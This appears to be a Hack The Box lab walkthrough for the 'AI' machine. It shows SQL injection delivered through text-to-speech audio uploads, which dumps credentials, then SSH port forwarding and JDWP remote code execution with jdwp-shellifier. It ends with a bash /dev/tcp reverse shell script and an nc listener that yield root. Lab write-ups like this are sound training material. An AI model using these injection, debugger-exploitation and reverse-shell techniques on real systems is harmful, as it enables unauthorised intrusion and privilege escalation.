@@ -1,0 +1,354 @@
+AI - Hack the Box - Linux Ubuntu
+
+Ports 22 and 80 open.
+
+We open the web page and notice each extension is php. we run a gobuster.
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $gobuster dir -u http://10.10.10.163/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-root-php.ou
+======================================================================================================================================
+
+They are doing voice recognition from audio files. Where we can upload files, what we will do is upload a php file and see if we get 
+code execution.
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+<?php echo("Please"); ?>
+======================================================================================================================================
+
+How are files stored on the box, apparently there is an uploads directory. We also see an interesting message:
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+Drop a message to MrR3boot@ai.htb
+======================================================================================================================================
+
+We don't get much of it.
+
+We can try adding the name to the hosts file. We get someting interesting from http://ai.htb/intelligence.php
+Looking back at the wav file upload we probably need to upload a text2speech file
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+ 2004  sudo apt-get install gnustep-gui-runtime
+ 2015  sudo apt-get install festival
+ 2016  apt-file update
+ 2018  sudo apt-file update
+======================================================================================================================================
+
+We then try to locate the text2 speech binary
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $locate text2wave
+/usr/bin/text2wave
+/usr/share/man/man1/text2wave.1.gz
+======================================================================================================================================
+
+We create the wav file and upload it to the via the ai.php page
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "hello" | text2wave -o hello.wav
+======================================================================================================================================
+
+Next we can try a sql injection that is interpreted by the program we type the follwoing:
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "open single quote" | text2wave -o quote.wav
+
+your query using wav file.
+Select wav to upload:
+Our understanding of your input is : '
+Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1
+======================================================================================================================================
+
+If we go back to the inteligence page we come to find the what your input will be interpreted as by the ai machine. We will try to finish
+the union injection.
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "open single quote, join select, version open parenthesis close parenthesis comment database" | text2wave -o quote.wav
+'union select version()-- -
+
+Drop your query using wav file.
+Select wav to upload:
+Our understanding of your input is : 'union select version()-- -
+Query result : 5.7.27-0ubuntu0.18.04.1
+======================================================================================================================================
+
+So the key was contructing a sql injection that the database could interpret and the results are displayed. Query result only returns
+one row. Thankfully it does not do multiple columns.
+
+Next possible query result,
+'union (select username)-- -
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "open single quote, join , select, username comment database" | text2wave -o quote.wav
+
+your query using wav file.
+Select wav to upload:
+Our understanding of your input is : 'union select username -- -
+Query result : Unknown column 'username' in 'field list'
+======================================================================================================================================
+
+It did not work so we can try other names.
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "open single quote, join , select, username from users comment database" | text2wave -o quote.wav
+
+Our understanding of your input is : 'union select username from users -- -
+Query result : alexa
+======================================================================================================================================
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $echo "open single quote, join , select, password from users comment database" | text2wave -o quote.wav
+
+Our understanding of your input is : 'union select password from users -- -
+Query result : H,Sq9t6}a<)?q93_
+======================================================================================================================================
+
+So we end up getting both a user and password: alexa:H,Sq9t6}a<)?q93_
+Lets try ssh
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $ssh alexa@ai.htb
+The authenticity of host 'ai.htb (10.10.10.163)' can't be established.
+ECDSA key fingerprint is SHA256:ghI7byxujOo6BLzCOPFbXgVPMmJVCoRsMuPs3zBgRQM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'ai.htb,10.10.10.163' (ECDSA) to the list of known hosts.
+alexa@ai.htb's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 5.3.7-050307-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Apr 13 21:55:31 UTC 2021
+
+  System load:  0.0                Processes:           158
+  Usage of /:   28.2% of 19.56GB   Users logged in:     0
+  Memory usage: 31%                IP address for eth0: 10.10.10.163
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+63 packages can be updated.
+15 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Thu Oct 24 15:04:38 2019 from 192.168.0.104
+alexa@AI:~$ ls
+user.txt
+======================================================================================================================================
+
+Once in we run linpeas.sh for the privesc. Looks like root is running a java program.
+COMMANDS and OUTPUT:
+======================================================================================================================================
+root       4921  6.3  5.3 3137572 107544 ?      Sl   22:02   0:04 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
+======================================================================================================================================
+
+Jdwp is running on port 8000, tomcat. We can take a quick glance at the sql databsase we use the credentials stored in db.php
+COMMANDS and OUTPUT:
+======================================================================================================================================
+alexa@AI:/var/www/html$ cat db.php 
+<?php
+$conn = new mysqli('localhost','dbuser','toor','alexa');
+if (mysqli_connect_errno())
+  {
+  echo "Failed to connect to MySQL: " . mysqli_connect_error();
+  }
+?>
+======================================================================================================================================
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+alexa@AI:/var/www/html$ mysql -u dbuser -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 25
+Server version: 5.7.27-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use alexa
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+    -> ;
++-----------------+
+| Tables_in_alexa |
++-----------------+
+| alexa           |
+| users           |
++-----------------+
+2 rows in set (0.00 sec)
+
+mysql> describe alexa
+    -> ;
++--------+----------------+------+-----+---------+-------+
+| Field  | Type           | Null | Key | Default | Extra |
++--------+----------------+------+-----+---------+-------+
+| query  | varchar(10000) | YES  |     | NULL    |       |
+| output | varchar(10000) | YES  |     | NULL    |       |
++--------+----------------+------+-----+---------+-------+
+2 rows in set (0.01 sec)
+
+mysql> select * from alexa;
++---------------+----------------------------------------------------------+
+| query         | output                                                   |
++---------------+----------------------------------------------------------+
+| say hi python | print("hi")                                              |
+| say hi in c   | #include int main() { printf("Hello World"); return 0; } |
++---------------+----------------------------------------------------------+
+2 rows in set (0.00 sec)
+
+mysql> select * from users;
++----------+------------------+
+| username | password         |
++----------+------------------+
+| alexa    | H,Sq9t6}a<)?q93_ |
+| root     | H,Sq9t6}a<)?q931 |
+| dbuser   | toor             |
+| awsadm   | awsadm           |
++----------+------------------+
+4 rows in set (0.01 sec)
+
+======================================================================================================================================
+
+We get a set of creds for root but they do not authenticate. We go back and look at ss -lntp output and we want to redirect the ports 
+from the java app run by root. We can do this with ssh.
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+alexa@AI:/var/www/html$ ss -lntp
+State           Recv-Q            Send-Q                             Local Address:Port                       Peer Address:Port           
+LISTEN          0                 128                                      0.0.0.0:22                              0.0.0.0:*              
+LISTEN          0                 1                                      127.0.0.1:8000                            0.0.0.0:*              
+LISTEN          0                 80                                     127.0.0.1:3306                            0.0.0.0:*              
+LISTEN          0                 128                                127.0.0.53%lo:53                              0.0.0.0:*              
+LISTEN          0                 128                                         [::]:22                                 [::]:*              
+LISTEN          0                 1                             [::ffff:127.0.0.1]:8005                                  *:*              
+LISTEN          0                 100                           [::ffff:127.0.0.1]:8009                                  *:*              
+LISTEN          0                 100                           [::ffff:127.0.0.1]:8080                                  *:*              
+LISTEN          0                 128                                            *:80                                    *:*
+======================================================================================================================================
+
+8080 is tomcat itself. We will forward 3 ports 
+
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $ssh -L 8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080 alexa@10.10.10.163
+alexa@10.10.10.163's password: 
+
+alexa@AI:~$ ~c
+~c: command not found
+alexa@AI:~$ 
+ssh> -L 8000:localhost:8000
+Forwarding port.
+
+======================================================================================================================================
+
+We still need creds to access the tomcat server to look at the status. We will need to go to the java debugging port.
+
+We should now be able to reach those ports on our local machine.
+COMMANDS and OUTPUT:
+======================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai/www]
+└──╼ $jdb -attach 8000
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+> 
+The application has been disconnected
+======================================================================================================================================
+
+We are looking forn java runtime functions so we can get high privileges. We have to be in a thread to run. We try running various
+methods such as:
+COMMANDS and OUTPUT:
+=====================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $jdb -attach 8000
+Set uncaught java.lang.Throwable
+Set deferred uncaught java.lang.Throwable
+Initializing jdb ...
+> stop in java.lang.String.indexOf(int)
+Set breakpoint java.lang.String.indexOf(int)
+> 
+Breakpoint hit: "thread=main", java.lang.String.indexOf(), line=1,535 bci=0
+
+main[1] print new java.lang.Runtime().exec("/bin/touch /tmp/pleaseme.txt")
+
+======================================================================================================================================
+However non of these worked or took to long to run so our next best thing was to run a python script that would automate the jdb 
+process by querying constantly and waiting for a method to return and get remote code execution.
+
+COMMANDS and OUTPUT:
+======================================================================================================================================┌─[user@parrot-virtual]─[~/htb/ai/www/jdwp-shellifier]
+└──╼ $python2 jdwp-shellifier.py -t 127.0.0.1 --break-on "java.lang.String.indexOf" --cmd "/tmp/runme.sh" 
+[+] Targeting '127.0.0.1:8000'
+[+] Reading settings for 'OpenJDK 64-Bit Server VM - 11.0.4'
+[+] Found Runtime class: id=a9f
+[+] Found Runtime.getRuntime(): id=7f42d80239a0
+[+] Created break event id=2
+[+] Waiting for an event on 'java.lang.String.indexOf'
+[+] Received matching event from thread 0x1
+[+] Selected payload '/tmp/runme.sh'
+[+] Command string object created id:b44
+[+] Runtime.getRuntime() returned context id:0xb45
+[+] found Runtime.exec(): id=7f42d80239d8
+[+] Runtime.exec() successful, retId=b46
+[!] Command successfully executed
+======================================================================================================================================
+COMMANDS and OUTPUT:
+======================================================================================================================================┌─[user@parrot-virtual]─[~/htb/ai]
+└──╼ $nc -lnvp 9001
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::9001
+Ncat: Listening on 0.0.0.0:9001
+Ncat: Connection from 10.10.10.163.
+Ncat: Connection from 10.10.10.163:44208.
+bash: cannot set terminal process group (2842): Inappropriate ioctl for device
+bash: no job control in this shell
+root@AI:~# ls
+ls
+root.txt
+======================================================================================================================================
+
+COMMANDS and OUTPUT:
+=====================================================================================================================================
+alexa@AI:/tmp$ cat runme.sh 
+#!/bin/bash
+bash -c 'bash -i >& /dev/tcp/10.10.14.23/9001 0>&1'
+=====================================================================================================================================
